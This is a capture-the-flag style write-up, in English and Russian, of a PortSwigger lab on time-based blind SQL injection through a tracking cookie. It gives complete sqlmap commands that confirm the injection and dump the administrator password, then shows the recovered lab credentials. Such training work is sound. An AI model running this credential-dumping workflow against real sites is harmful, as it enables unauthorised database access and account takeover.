Lab
Blind SQL injection with time delays and information retrieval (PortSwigger Practitioner)

Goal
Extract administrator password from users table and login as admin.

1) Recon & injection point
На главной странице приложение использует cookie TrackingId для аналитики.
Параметр уязвим к time-based blind SQLi (PostgreSQL).

Проверка через sqlmap:

sqlmap -u "https://0a2800bb035964ad8176f2d800ec0084.web-security-academy.net/" \
  --cookie="TrackingId=<TRACKING_ID>*; session=<SESSION>" \
  -p TrackingId \
  --dbms=PostgreSQL \
  --technique=T --time-sec=5 --threads=1 \
  --batch
Результат:

Injection confirmed on Cookie #1*
Type: PostgreSQL > 8.1 AND time-based blind
DBMS: PostgreSQL
2) Data extraction (admin credentials)
Использован точечный дамп нужных столбцов:

sqlmap -u "https://0a2800bb035964ad8176f2d800ec0084.web-security-academy.net/" \
  --cookie="TrackingId=<TRACKING_ID>*; session=<SESSION>" \
  -p TrackingId \
  --dbms=PostgreSQL \
  --technique=T --time-sec=5 --threads=1 \
  --batch \
  -D public -T users -C username,password \
  --where="username='administrator'" \
  --dump
sqlmap retrieved:

username: administrator
password: xslkeg8tucgoz9udz701
3) Solve
Login form (My account) with:

Username: administrator
Password: xslkeg8tucgoz9udz701
После успешного входа лаба засчитывается как solved.

Notes
Для time-based extraction обязательно держать --threads=1.
Сообщения invalid character detected. retrying.. нормальны для blind/time-based; sqlmap обычно сам корректно добирает значение.
